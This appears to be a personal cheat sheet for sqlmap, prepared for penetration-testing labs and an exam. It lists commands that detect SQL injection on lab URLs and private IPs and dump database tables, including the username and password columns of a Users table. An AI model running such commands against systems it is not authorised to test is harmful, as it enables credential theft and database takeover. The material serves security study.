# sqlmap

![](assets/16511985745005.png)

## What is sqlmap

sqlmap is an open source penetration testing tool that automates the process of detecting and exploiting SQL injection flaws and taking over of database servers. It comes with a powerful detection engine, many niche features for the ultimate penetration tester and a broad range of switches lasting from database fingerprinting, over data fetching from the database, to accessing the underlying file system and executing commands on the operating system via out-of-band connections.

## How to use

### Show all Content & Tables without User Interaction

`sqlmap --tables --dump-all --batch -u https://ac021f111ea96192c01c0d2f00b200a8.web-security-academy.net/filter?category=Gifts`

**Plus level 5 & risk 3 & threads 5**
`sqlmap --tables --dump-all --batch --level 5 --risk 3 --threads 5 -u https://ac021f111ea96192c01c0d2f00b200a8.web-security-academy.net/filter?category=Gifts`

### Query URL with sqlmap

`sqlmap -u http://10.0.166.224/rest/products/search?q=test --level 5 --risk 3`

![Screenshot 2022-04-02 at 11.14.50](assets/Screenshot%202022-04-02%20at%2011.14.50.png)

### List Databases

`sqlmap -u http://10.0.166.224/rest/products/search?q=test --level 5 --risk 3 --tables`

![Screenshot 2022-04-02 at 11.47.42](assets/Screenshot%202022-04-02%20at%2011.47.42.png)

### Show Table Structure of Users

`sqlmap -u http://10.0.166.224/rest/products/search?q=test --level 5 --risk 3 -T Users --columns`

![Screenshot 2022-04-02 at 13.00.00](assets/Screenshot%202022-04-02%20at%2013.00.00.png)

### Output ‘password’ column in table ‘Users’

![Screenshot 2022-04-02 at 13.02.13](assets/Screenshot%202022-04-02%20at%2013.02.13.png)

### Output ‘username’ column in table ‘Users’

`sqlmap --threads 5  -u http://10.0.127.230/rest/products/search?q=test --level 5 --risk 3 -T Users -C username --dump`

![Table Users](assets/Table%20Users.png)

### Output all  columns in table ‘Users’

`sqlmap --threads 5  -u http://10.0.127.230/rest/products/search?q=test --level 5 --risk 3 -T Users --dump`

![dsdefaultAdnin](assets/dsdefaultAdnin.png)



----



Previous Exam:

```
sqlmap -r req.txt -v 5 --proxy="http://localhost:8080" --force-ssl -D laravel -T payments --dump
```

![](assets/2022-10-27-16-29-32-image.png)
